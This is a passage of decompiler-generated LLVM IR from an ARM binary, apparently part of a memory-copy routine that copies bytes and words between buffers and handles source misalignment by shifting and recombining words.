  %v3_138b4 = load i32, i32* %r2.global-to-local, align 4
  %v4_138b4 = add i32 %v3_138b4, -12
  store i32 %v4_138b4, i32* %r2.global-to-local, align 4
  %v6_138b4 = sub i32 11, %v3_138b4
  %v7_138b4 = and i32 %v6_138b4, %v3_138b4
  %v8_138b4 = icmp slt i32 %v7_138b4, 0
  store i1 %v8_138b4, i1* %cpsr_v.global-to-local, align 1
  %v9_138b4 = icmp slt i32 %v4_138b4, 0
  store i1 %v9_138b4, i1* %cpsr_n.global-to-local, align 1
  %v10_138b4 = icmp eq i32 %v3_138b4, 12
  store i1 %v10_138b4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_138ac, %bb138
  %v0_138bc.pre = phi i32 [ %v4_138b4, %bb138 ], [ %v0_138bc.pre157, %dec_label_pc_138ac ]
  %v3_138b098115 = phi i32 [ %v12_138b0, %bb138 ], [ %v3_138b0, %dec_label_pc_138ac ]
  %v1_138b8 = phi i1 [ %v8_138b4, %bb138 ], [ %v1_138b4, %dec_label_pc_138ac ]
  %v0_138b8 = phi i1 [ %v9_138b4, %bb138 ], [ %v0_138b4, %dec_label_pc_138ac ]
  %v2_138b8 = xor i1 %v1_138b8, %v0_138b8
  br i1 %v2_138b8, label %dec_label_pc_138bc, label %dec_label_pc_138ac

dec_label_pc_138bc:                               ; preds = %.thread114, %dec_label_pc_13868
  %v4_138cc = phi i32 [ %v0_1388093, %dec_label_pc_13868 ], [ %v3_138b098115, %.thread114 ]
  %v0_138bc = phi i32 [ %v1_13868, %dec_label_pc_13868 ], [ %v0_138bc.pre, %.thread114 ]
  %v1_138bc = add i32 %v0_138bc, 8
  store i32 %v1_138bc, i32* %r2.global-to-local, align 4
  %v3_138bc = sub i32 0, %v0_138bc
  %v4_138bc = and i32 %v1_138bc, %v3_138bc
  %v5_138bc = icmp slt i32 %v4_138bc, 0
  store i1 %v5_138bc, i1* %cpsr_v.global-to-local, align 1
  %v6_138bc = icmp slt i32 %v1_138bc, 0
  store i1 %v6_138bc, i1* %cpsr_n.global-to-local, align 1
  %v7_138bc = icmp eq i32 %v1_138bc, 0
  store i1 %v7_138bc, i1* %cpsr_z.global-to-local, align 1
  %v2_138c0 = xor i1 %v6_138bc, %v5_138bc
  br i1 %v2_138c0, label %bb140, label %dec_label_pc_138c4

dec_label_pc_138c4:                               ; preds = %dec_label_pc_138bc
  %v1_138c4 = add i32 %v0_138bc, 4
  store i32 %v1_138c4, i32* %r2.global-to-local, align 4
  %v3_138c4 = sub i32 -5, %v0_138bc
  %v4_138c4 = and i32 %v3_138c4, %v1_138bc
  %v5_138c4 = icmp slt i32 %v4_138c4, 0
  store i1 %v5_138c4, i1* %cpsr_v.global-to-local, align 1
  %v6_138c4 = icmp slt i32 %v1_138c4, 0
  store i1 %v6_138c4, i1* %cpsr_n.global-to-local, align 1
  %v7_138c4 = icmp eq i32 %v1_138bc, 4
  store i1 %v7_138c4, i1* %cpsr_z.global-to-local, align 1
  %v2_138c8 = xor i1 %v6_138c4, %v5_138c4
  %v3_138c8 = load i32, i32* @r1, align 4
  %v4_138c8 = inttoptr i32 %v3_138c8 to i32*
  %v5_138c8 = load i32, i32* %v4_138c8, align 4
  store i32 %v5_138c8, i32* @r3, align 4
  %v7_138c8 = add i32 %v3_138c8, 4
  br i1 %v2_138c8, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_138c4
  store i32 %v7_138c8, i32* @r1, align 4
  %v5_138cc = inttoptr i32 %v4_138cc to i32*
  store i32 %v5_138c8, i32* %v5_138cc, align 4
  %v6_138cc = load i32, i32* %r0.global-to-local, align 4
  %v7_138cc = add i32 %v6_138cc, 4
  store i32 %v7_138cc, i32* %r0.global-to-local, align 4
  %v0_138dc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_138c4
  %v7_138d0 = inttoptr i32 %v7_138c8 to i32*
  %v8_138d0 = load i32, i32* %v7_138d0, align 4
  store i32 %v8_138d0, i32* @ip, align 4
  %v9_138d0 = add i32 %v3_138c8, 8
  store i32 %v9_138d0, i32* @r1, align 4
  %v4_138d4 = inttoptr i32 %v4_138cc to i32*
  store i32 %v5_138c8, i32* %v4_138d4, align 4
  %v6_138d4 = add i32 %v4_138cc, 4
  %v7_138d4 = inttoptr i32 %v6_138d4 to i32*
  %v8_138d4 = load i32, i32* @ip, align 4
  store i32 %v8_138d4, i32* %v7_138d4, align 4
  %v9_138d4 = add i32 %v4_138cc, 8
  store i32 %v9_138d4, i32* %r0.global-to-local, align 4
  %v3_138d8 = load i32, i32* %r2.global-to-local, align 4
  %v4_138d8 = add i32 %v3_138d8, -4
  store i32 %v4_138d8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_138bc, %bb, %dec_label_pc_13a8c, %dec_label_pc_13a20, %dec_label_pc_139b4, %bb139
  %v0_138dc = phi i32 [ %v0_138dc.pre, %.thread121 ], [ %v2_1392c, %.thread127 ], [ %v1_138bc, %dec_label_pc_138bc ], [ %v2_13850, %bb ], [ %v0_138dc60, %dec_label_pc_13a8c ], [ %v0_138dc59, %dec_label_pc_13a20 ], [ %v0_138dc58, %dec_label_pc_139b4 ], [ %v4_138d8, %bb139 ]
  %v1_138dc = add i32 %v0_138dc, 4
  store i32 %v1_138dc, i32* %r2.global-to-local, align 4
  %v3_138dc = sub i32 0, %v0_138dc
  %v4_138dc = and i32 %v1_138dc, %v3_138dc
  %v5_138dc = icmp slt i32 %v4_138dc, 0
  store i1 %v5_138dc, i1* %cpsr_v.global-to-local, align 1
  %v6_138dc = icmp slt i32 %v1_138dc, 0
  store i1 %v6_138dc, i1* %cpsr_n.global-to-local, align 1
  %v7_138dc = icmp eq i32 %v1_138dc, 0
  store i1 %v7_138dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_138dc, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_138e4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_138e0 = load i8*, i8** %stack_var_-8, align 4
  %v4_138e0 = ptrtoint i8* %v3_138e0 to i32
  store i32 %v4_138e0, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_138e4 = phi i32 [ %v0_138e4.pre, %bb140.bb142_crit_edge ], [ %v8_1384c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_138dc, i32 %v0_138e4)
  %v0_138e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_138e8 = add i32 %v0_138e8, -2
  %v3_138e8 = sub i32 1, %v0_138e8
  %v4_138e8 = and i32 %v3_138e8, %v0_138e8
  %v5_138e8 = icmp slt i32 %v4_138e8, 0
  store i1 %v5_138e8, i1* %cpsr_v.global-to-local, align 1
  %v6_138e8 = icmp slt i32 %v1_138e8, 0
  store i1 %v6_138e8, i1* %cpsr_n.global-to-local, align 1
  %v7_138e8 = icmp eq i32 %v0_138e8, 2
  store i1 %v7_138e8, i1* %cpsr_z.global-to-local, align 1
  %v0_138ec = load i32, i32* @r1, align 4
  %v1_138ec = inttoptr i32 %v0_138ec to i8*
  %v2_138ec = load i8, i8* %v1_138ec, align 1
  %v5_138ec = add i32 %v0_138ec, 1
  store i32 %v5_138ec, i32* %r1.global-to-local, align 4
  %v2_138f0 = load i32, i32* %r0.global-to-local, align 4
  %v3_138f0 = inttoptr i32 %v2_138f0 to i8*
  store i8 %v2_138ec, i8* %v3_138f0, align 1
  %v4_138f0 = load i32, i32* %r0.global-to-local, align 4
  %v5_138f0 = add i32 %v4_138f0, 1
  store i32 %v5_138f0, i32* %r0.global-to-local, align 4
  %v0_138f4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_138f4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_138f4 = xor i1 %v0_138f4, %v1_138f4
  br i1 %v2_138f4, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_138f4 = load i32, i32* %r1.global-to-local, align 4
  %v4_138f4 = inttoptr i32 %v3_138f4 to i8*
  %v5_138f4 = load i8, i8* %v4_138f4, align 1
  %v8_138f4 = add i32 %v3_138f4, 1
  store i32 %v8_138f4, i32* %r1.global-to-local, align 4
  %v6_138f8 = inttoptr i32 %v5_138f0 to i8*
  store i8 %v5_138f4, i8* %v6_138f8, align 1
  %v7_138f8 = load i32, i32* %r0.global-to-local, align 4
  %v8_138f8 = add i32 %v7_138f8, 1
  store i32 %v8_138f8, i32* %r0.global-to-local, align 4
  %v1_138fc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_138fc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_13900 = phi i32 [ %v8_138f8, %bb143 ], [ %v5_138f0, %bb142 ]
  %v2_13900 = phi i1 [ %v2_138fc.pre, %bb143 ], [ %v1_138f4, %bb142 ]
  %v1_13900 = phi i1 [ %v1_138fc.pre, %bb143 ], [ %v0_138f4, %bb142 ]
  %v0_138fc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_138fc = xor i1 %v2_13900, %v1_13900
  %v4_138fc = or i1 %v0_138fc, %v3_138fc
  br i1 %v4_138fc, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_138fc = load i32, i32* %r1.global-to-local, align 4
  %v6_138fc = inttoptr i32 %v5_138fc to i8*
  %v7_138fc = load i8, i8* %v6_138fc, align 1
  %v10_138fc = add i32 %v5_138fc, 1
  store i32 %v10_138fc, i32* %r1.global-to-local, align 4
  %v8_13900 = inttoptr i32 %v7_13900 to i8*
  store i8 %v7_138fc, i8* %v8_13900, align 1
  %v9_13900 = load i32, i32* %r0.global-to-local, align 4
  %v10_13900 = add i32 %v9_13900, 1
  store i32 %v10_13900, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_13904 = load i8*, i8** %stack_var_-8, align 4
  %v3_13904 = ptrtoint i8* %v2_13904 to i32
  store i32 %v3_13904, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_1384c)
  %v0_1390c.pre = load i32, i32* @ip, align 4
  %v0_13914.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_13918.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1390c

dec_label_pc_1390c:                               ; preds = %dec_label_pc_13858, %.thread125
  %v2_13918 = phi i32 [ %v1_13840, %dec_label_pc_13858 ], [ %v2_13918.pre, %.thread125 ]
  %v0_13914 = phi i32 [ %v0_13840, %dec_label_pc_13858 ], [ %v0_13914.pre, %.thread125 ]
  %v0_1390c = phi i32 [ %v1_13858, %dec_label_pc_13858 ], [ %v0_1390c.pre, %.thread125 ]
  %v1_1390c = sub i32 4, %v0_1390c
  store i32 %v1_1390c, i32* @ip, align 4
  %v1_13910 = add i32 %v1_1390c, -2
  %v3_13910 = sub i32 1, %v1_1390c
  %v4_13910 = and i32 %v3_13910, %v1_1390c
  %v5_13910 = icmp slt i32 %v4_13910, 0
  store i1 %v5_13910, i1* %cpsr_v.global-to-local, align 1
  %v6_13910 = icmp slt i32 %v1_13910, 0
  store i1 %v6_13910, i1* %cpsr_n.global-to-local, align 1
  %v7_13910 = icmp eq i32 %v1_1390c, 2
  store i1 %v7_13910, i1* %cpsr_z.global-to-local, align 1
  %v1_13914 = inttoptr i32 %v0_13914 to i8*
  %v2_13914 = load i8, i8* %v1_13914, align 1
  %v3_13914 = zext i8 %v2_13914 to i32
  store i32 %v3_13914, i32* @r3, align 4
  %v5_13914 = add i32 %v0_13914, 1
  store i32 %v5_13914, i32* @r1, align 4
  %v3_13918 = inttoptr i32 %v2_13918 to i8*
  store i8 %v2_13914, i8* %v3_13918, align 1
  %v4_13918 = load i32, i32* %r0.global-to-local, align 4
  %v5_13918 = add i32 %v4_13918, 1
  store i32 %v5_13918, i32* %r0.global-to-local, align 4
  %v0_1391c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1391c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1391c = xor i1 %v0_1391c, %v1_1391c
  br i1 %v2_1391c, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_1390c
  %v3_1391c = load i32, i32* @r1, align 4
  %v4_1391c = inttoptr i32 %v3_1391c to i8*
  %v5_1391c = load i8, i8* %v4_1391c, align 1
  %v6_1391c = zext i8 %v5_1391c to i32
  store i32 %v6_1391c, i32* @r3, align 4
  %v8_1391c = add i32 %v3_1391c, 1
  store i32 %v8_1391c, i32* @r1, align 4
  %v6_13920 = inttoptr i32 %v5_13918 to i8*
  store i8 %v5_1391c, i8* %v6_13920, align 1
  %v7_13920 = load i32, i32* %r0.global-to-local, align 4
  %v8_13920 = add i32 %v7_13920, 1
  store i32 %v8_13920, i32* %r0.global-to-local, align 4
  %v1_13924.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_13924.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_1390c, %bb145
  %v7_13928 = phi i32 [ %v8_13920, %bb145 ], [ %v5_13918, %dec_label_pc_1390c ]
  %v2_13928 = phi i1 [ %v2_13924.pre, %bb145 ], [ %v1_1391c, %dec_label_pc_1390c ]
  %v1_13928 = phi i1 [ %v1_13924.pre, %bb145 ], [ %v0_1391c, %dec_label_pc_1390c ]
  %v0_13924 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_13924 = xor i1 %v2_13928, %v1_13928
  %v4_13924 = or i1 %v0_13924, %v3_13924
  br i1 %v4_13924, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_13924 = load i32, i32* @r1, align 4
  %v6_13924 = inttoptr i32 %v5_13924 to i8*
  %v7_13924 = load i8, i8* %v6_13924, align 1
  %v8_13924 = zext i8 %v7_13924 to i32
  store i32 %v8_13924, i32* @r3, align 4
  %v10_13924 = add i32 %v5_13924, 1
  store i32 %v10_13924, i32* @r1, align 4
  %v8_13928 = inttoptr i32 %v7_13928 to i8*
  store i8 %v7_13924, i8* %v8_13928, align 1
  %v9_13928 = load i32, i32* %r0.global-to-local, align 4
  %v10_13928 = add i32 %v9_13928, 1
  store i32 %v10_13928, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_13a5c76 = phi i32 [ %v10_13928, %bb146 ], [ %v7_13928, %.thread126 ]
  %v0_1392c = load i32, i32* %r2.global-to-local, align 4
  %v1_1392c = load i32, i32* @ip, align 4
  %v2_1392c = sub i32 %v0_1392c, %v1_1392c
  store i32 %v2_1392c, i32* %r2.global-to-local, align 4
  %v4_1392c = xor i32 %v1_1392c, %v0_1392c
  %v5_1392c = xor i32 %v2_1392c, %v0_1392c
  %v6_1392c = and i32 %v5_1392c, %v4_1392c
  %v7_1392c = icmp slt i32 %v6_1392c, 0
  store i1 %v7_1392c, i1* %cpsr_v.global-to-local, align 1
  %v8_1392c = icmp slt i32 %v2_1392c, 0
  store i1 %v8_1392c, i1* %cpsr_n.global-to-local, align 1
  %v9_1392c = icmp eq i32 %v0_1392c, %v1_1392c
  store i1 %v9_1392c, i1* %cpsr_z.global-to-local, align 1
  %v2_13930 = xor i1 %v8_1392c, %v7_1392c
  br i1 %v2_13930, label %bb140, label %dec_label_pc_13934

dec_label_pc_13934:                               ; preds = %.thread127
  %v0_13934 = load i32, i32* @r1, align 4
  %v1_13934 = urem i32 %v0_13934, 4
  store i32 %v1_13934, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13934 = icmp eq i32 %v1_13934, 0
  store i1 %v2_13934, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_13934 to i2
  br i1 %v2_13934, label %dec_label_pc_13868, label %dec_label_pc_1393c

dec_label_pc_1393c:                               ; preds = %dec_label_pc_13860, %dec_label_pc_13934
  %v0_13a5c75 = phi i32 [ %v1_13840, %dec_label_pc_13860 ], [ %v0_13a5c76, %dec_label_pc_13934 ]
  %v0_139c4 = phi i32 [ %v2_13850, %dec_label_pc_13860 ], [ %v2_1392c, %dec_label_pc_13934 ]
  %v0_13944.off0 = phi i2 [ %extract.t, %dec_label_pc_13860 ], [ %extract.t130, %dec_label_pc_13934 ]
  %v0_1393c = phi i32 [ %v0_13840, %dec_label_pc_13860 ], [ %v0_13934, %dec_label_pc_13934 ]
  %v1_1393c = and i32 %v0_1393c, -4
  store i32 %v1_1393c, i32* %r1.global-to-local, align 4
  %v1_13940 = inttoptr i32 %v1_1393c to i32*
  %v2_13940 = load i32, i32* %v1_13940, align 4
  store i32 %v2_13940, i32* %lr.global-to-local, align 4
  %v4_13940 = add i32 %v1_1393c, 4
  store i32 %v4_13940, i32* %r1.global-to-local, align 4
  %v1_139bc = add i32 %v0_139c4, -12
  %v3_139bc = sub i32 11, %v0_139c4
  %v4_139bc = and i32 %v3_139bc, %v0_139c4
  %v5_139bc = icmp slt i32 %v4_139bc, 0
  store i1 %v5_139bc, i1* %cpsr_v.global-to-local, align 1
  %v6_139bc = icmp slt i32 %v1_139bc, 0
  store i1 %v6_139bc, i1* %cpsr_n.global-to-local, align 1
  %v7_139bc = icmp eq i32 %v0_139c4, 12
  store i1 %v7_139bc, i1* %cpsr_z.global-to-local, align 1
  %v2_139c0 = xor i1 %v6_139bc, %v5_139bc
  switch i2 %v0_13944.off0, label %dec_label_pc_13950 [
    i2 -1, label %dec_label_pc_13a28
    i2 -2, label %dec_label_pc_139bc
  ]

dec_label_pc_13950:                               ; preds = %dec_label_pc_1393c
  br i1 %v2_139c0, label %dec_label_pc_1399c, label %dec_label_pc_13958

dec_label_pc_13958:                               ; preds = %dec_label_pc_13950
  store i32 %v1_139bc, i32* %r2.global-to-local, align 4
  %v3_1395c = load i32, i32* @r4, align 4
  store i32 %v3_1395c, i32* %stack_var_-16, align 4
  %v6_1395c = load i32, i32* @r5, align 4
  store i32 %v6_1395c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13960

dec_label_pc_13960:                               ; preds = %dec_label_pc_13960.dec_label_pc_13960_crit_edge, %dec_label_pc_13958
  %v0_13984 = phi i32 [ %v12_13984, %dec_label_pc_13960.dec_label_pc_13960_crit_edge ], [ %v0_13a5c75, %dec_label_pc_13958 ]
  %v0_13964 = phi i32 [ %v0_13964.pre, %dec_label_pc_13960.dec_label_pc_13960_crit_edge ], [ %v4_13940, %dec_label_pc_13958 ]
  %v0_13960 = phi i32 [ %v0_13960.pre, %dec_label_pc_13960.dec_label_pc_13960_crit_edge ], [ %v2_13940, %dec_label_pc_13958 ]
  %v3_13960 = udiv i32 %v0_13960, 256
  %v1_13964 = inttoptr i32 %v0_13964 to i32*
  %v2_13964 = load i32, i32* %v1_13964, align 4
  store i32 %v2_13964, i32* %r4.global-to-local, align 4
  %v3_13964 = add i32 %v0_13964, 4
  %v4_13964 = inttoptr i32 %v3_13964 to i32*
  %v5_13964 = load i32, i32* %v4_13964, align 4
  store i32 %v5_13964, i32* %r5.global-to-local, align 4
  %v6_13964 = add i32 %v0_13964, 8
  %v7_13964 = inttoptr i32 %v6_13964 to i32*
  %v8_13964 = load i32, i32* %v7_13964, align 4
  store i32 %v8_13964, i32* %ip.global-to-local, align 4
  %v9_13964 = add i32 %v0_13964, 12
  %v10_13964 = inttoptr i32 %v9_13964 to i32*
  %v11_13964 = load i32, i32* %v10_13964, align 4
  store i32 %v11_13964, i32* %lr.global-to-local, align 4
  %v12_13964 = add i32 %v0_13964, 16
  store i32 %v12_13964, i32* %r1.global-to-local, align 4
  %v4_13968 = mul i32 %v2_13964, 16777216
  %v5_13968 = or i32 %v4_13968, %v3_13960
  store i32 %v5_13968, i32* @r3, align 4
  %v3_1396c = udiv i32 %v2_13964, 256
  %v4_13970 = mul i32 %v5_13964, 16777216
  %v5_13970 = or i32 %v4_13970, %v3_1396c
  store i32 %v5_13970, i32* %r4.global-to-local, align 4
  %v3_13974 = udiv i32 %v5_13964, 256
  %v4_13978 = mul i32 %v8_13964, 16777216
  %v5_13978 = or i32 %v4_13978, %v3_13974
  store i32 %v5_13978, i32* %r5.global-to-local, align 4
  %v3_1397c = udiv i32 %v8_13964, 256
  %v4_13980 = mul i32 %v11_13964, 16777216
  %v5_13980 = or i32 %v4_13980, %v3_1397c
  store i32 %v5_13980, i32* @ip, align 4
  %v1_13984 = inttoptr i32 %v0_13984 to i32*
  store i32 %v5_13968, i32* %v1_13984, align 4
  %v3_13984 = add i32 %v0_13984, 4
  %v4_13984 = inttoptr i32 %v3_13984 to i32*
  %v5_13984 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13984, i32* %v4_13984, align 4
  %v6_13984 = add i32 %v0_13984, 8
  %v7_13984 = inttoptr i32 %v6_13984 to i32*
  %v8_13984 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_13984, i32* %v7_13984, align 4
  %v9_13984 = add i32 %v0_13984, 12
  %v10_13984 = inttoptr i32 %v9_13984 to i32*
  %v11_13984 = load i32, i32* @ip, align 4
  store i32 %v11_13984, i32* %v10_13984, align 4
  %v12_13984 = add i32 %v0_13984, 16
  store i32 %v12_13984, i32* %r0.global-to-local, align 4
  %v0_13988 = load i32, i32* %r2.global-to-local, align 4
  %v1_13988 = add i32 %v0_13988, -16
  store i32 %v1_13988, i32* %r2.global-to-local, align 4
  %v3_13988 = sub i32 15, %v0_13988
  %v4_13988 = and i32 %v3_13988, %v0_13988
  %v5_13988 = icmp slt i32 %v4_13988, 0
  %v6_13988 = icmp slt i32 %v1_13988, 0
  %v2_1398c = xor i1 %v6_13988, %v5_13988
  br i1 %v2_1398c, label %dec_label_pc_13990, label %dec_label_pc_13960.dec_label_pc_13960_crit_edge

dec_label_pc_13960.dec_label_pc_13960_crit_edge:  ; preds = %dec_label_pc_13960
  %v0_13960.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_13964.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13960

dec_label_pc_13990:                               ; preds = %dec_label_pc_13960
  %v2_13990 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13990, i32* @r4, align 4
  %v5_13990 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_13990, i32* @r5, align 4
  %v1_13994 = add i32 %v0_13988, -4
  store i32 %v1_13994, i32* %r2.global-to-local, align 4
  %v3_13994 = add i32 %v0_13988, 2147483632
  %v4_13994 = and i32 %v1_13994, %v3_13994
  %v5_13994 = icmp slt i32 %v4_13994, 0
  store i1 %v5_13994, i1* %cpsr_v.global-to-local, align 1
  %v6_13994 = icmp slt i32 %v1_13994, 0
  store i1 %v6_13994, i1* %cpsr_n.global-to-local, align 1
  %v7_13994 = icmp eq i32 %v1_13994, 0
  store i1 %v7_13994, i1* %cpsr_z.global-to-local, align 1
  %v2_13998 = xor i1 %v6_13994, %v5_13994
  br i1 %v2_13998, label %dec_label_pc_139b4, label %dec_label_pc_1399c

dec_label_pc_1399c:                               ; preds = %dec_label_pc_13990, %dec_label_pc_13950, %dec_label_pc_1399c
  %v1_139a8 = phi i32 [ %v4_139a8, %dec_label_pc_1399c ], [ %v12_13984, %dec_label_pc_13990 ], [ %v0_13a5c75, %dec_label_pc_13950 ]
  %v0_1399c = load i32, i32* %lr.global-to-local, align 4
  %v3_1399c = udiv i32 %v0_1399c, 256
  store i32 %v3_1399c, i32* %ip.global-to-local, align 4
  %v0_139a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_139a0 = inttoptr i32 %v0_139a0 to i32*
  %v2_139a0 = load i32, i32* %v1_139a0, align 4
  store i32 %v2_139a0, i32* %lr.global-to-local, align 4
  %v4_139a0 = add i32 %v0_139a0, 4
  store i32 %v4_139a0, i32* %r1.global-to-local, align 4
  %v4_139a4 = mul i32 %v2_139a0, 16777216
  %v5_139a4 = or i32 %v4_139a4, %v3_1399c
  store i32 %v5_139a4, i32* @ip, align 4
  %v2_139a8 = inttoptr i32 %v1_139a8 to i32*
  store i32 %v5_139a4, i32* %v2_139a8, align 4
  %v3_139a8 = load i32, i32* %r0.global-to-local, align 4
  %v4_139a8 = add i32 %v3_139a8, 4
  store i32 %v4_139a8, i32* %r0.global-to-local, align 4
  %v0_139ac = load i32, i32* %r2.global-to-local, align 4
  %v1_139ac = add i32 %v0_139ac, -4
  store i32 %v1_139ac, i32* %r2.global-to-local, align 4
  %v3_139ac = sub i32 3, %v0_139ac
  %v4_139ac = and i32 %v3_139ac, %v0_139ac
  %v5_139ac = icmp slt i32 %v4_139ac, 0
  %v6_139ac = icmp slt i32 %v1_139ac, 0
  %v2_139b0 = xor i1 %v6_139ac, %v5_139ac
  br i1 %v2_139b0, label %dec_label_pc_139b4.loopexit, label %dec_label_pc_1399c

dec_label_pc_139b4.loopexit:                      ; preds = %dec_label_pc_1399c
  %v7_139ac = icmp eq i32 %v0_139ac, 4
  store i1 %v5_139ac, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_139ac, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_139ac, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_139b4

dec_label_pc_139b4:                               ; preds = %dec_label_pc_139b4.loopexit, %dec_label_pc_13990
  %v0_138dc58 = phi i32 [ %v1_139ac, %dec_label_pc_139b4.loopexit ], [ %v1_13994, %dec_label_pc_13990 ]
  %v0_139b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_139b4 = add i32 %v0_139b4, -3
  store i32 %v1_139b4, i32* @r1, align 4
  br label %bb140

dec_label_pc_139bc:                               ; preds = %dec_label_pc_1393c
  br i1 %v2_139c0, label %dec_label_pc_13a08, label %dec_label_pc_139c4

dec_label_pc_139c4:                               ; preds = %dec_label_pc_139bc
  store i32 %v1_139bc, i32* %r2.global-to-local, align 4
  %v3_139c8 = load i32, i32* @r4, align 4
  store i32 %v3_139c8, i32* %stack_var_-16, align 4
  %v6_139c8 = load i32, i32* @r5, align 4
  store i32 %v6_139c8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_139cc

dec_label_pc_139cc:                               ; preds = %dec_label_pc_139cc.dec_label_pc_139cc_crit_edge, %dec_label_pc_139c4
  %v0_139f0 = phi i32 [ %v12_139f0, %dec_label_pc_139cc.dec_label_pc_139cc_crit_edge ], [ %v0_13a5c75, %dec_label_pc_139c4 ]
  %v0_139d0 = phi i32 [ %v0_139d0.pre, %dec_label_pc_139cc.dec_label_pc_139cc_crit_edge ], [ %v4_13940, %dec_label_pc_139c4 ]
  %v0_139cc = phi i32 [ %v0_139cc.pre, %dec_label_pc_139cc.dec_label_pc_139cc_crit_edge ], [ %v2_13940, %dec_label_pc_139c4 ]
  %v3_139cc = udiv i32 %v0_139cc, 65536
  %v1_139d0 = inttoptr i32 %v0_139d0 to i32*
  %v2_139d0 = load i32, i32* %v1_139d0, align 4
  store i32 %v2_139d0, i32* %r4.global-to-local, align 4
  %v3_139d0 = add i32 %v0_139d0, 4
  %v4_139d0 = inttoptr i32 %v3_139d0 to i32*
  %v5_139d0 = load i32, i32* %v4_139d0, align 4
  store i32 %v5_139d0, i32* %r5.global-to-local, align 4
  %v6_139d0 = add i32 %v0_139d0, 8
  %v7_139d0 = inttoptr i32 %v6_139d0 to i32*
  %v8_139d0 = load i32, i32* %v7_139d0, align 4
  store i32 %v8_139d0, i32* %ip.global-to-local, align 4
  %v9_139d0 = add i32 %v0_139d0, 12
  %v10_139d0 = inttoptr i32 %v9_139d0 to i32*
  %v11_139d0 = load i32, i32* %v10_139d0, align 4
  store i32 %v11_139d0, i32* %lr.global-to-local, align 4
  %v12_139d0 = add i32 %v0_139d0, 16
  store i32 %v12_139d0, i32* %r1.global-to-local, align 4
  %v4_139d4 = mul i32 %v2_139d0, 65536
  %v5_139d4 = or i32 %v4_139d4, %v3_139cc
  store i32 %v5_139d4, i32* @r3, align 4
  %v3_139d8 = udiv i32 %v2_139d0, 65536
  %v4_139dc = mul i32 %v5_139d0, 65536
  %v5_139dc = or i32 %v4_139dc, %v3_139d8
  store i32 %v5_139dc, i32* %r4.global-to-local, align 4
  %v3_139e0 = udiv i32 %v5_139d0, 65536
  %v4_139e4 = mul i32 %v8_139d0, 65536
  %v5_139e4 = or i32 %v4_139e4, %v3_139e0
  store i32 %v5_139e4, i32* %r5.global-to-local, align 4
  %v3_139e8 = udiv i32 %v8_139d0, 65536
  %v4_139ec = mul i32 %v11_139d0, 65536
  %v5_139ec = or i32 %v4_139ec, %v3_139e8
  store i32 %v5_139ec, i32* @ip, align 4
  %v1_139f0 = inttoptr i32 %v0_139f0 to i32*
  store i32 %v5_139d4, i32* %v1_139f0, align 4
  %v3_139f0 = add i32 %v0_139f0, 4
  %v4_139f0 = inttoptr i32 %v3_139f0 to i32*
  %v5_139f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_139f0, i32* %v4_139f0, align 4
  %v6_139f0 = add i32 %v0_139f0, 8
  %v7_139f0 = inttoptr i32 %v6_139f0 to i32*
  %v8_139f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_139f0, i32* %v7_139f0, align 4
  %v9_139f0 = add i32 %v0_139f0, 12
  %v10_139f0 = inttoptr i32 %v9_139f0 to i32*
  %v11_139f0 = load i32, i32* @ip, align 4
  store i32 %v11_139f0, i32* %v10_139f0, align 4
  %v12_139f0 = add i32 %v0_139f0, 16
  store i32 %v12_139f0, i32* %r0.global-to-local, align 4
  %v0_139f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_139f4 = add i32 %v0_139f4, -16
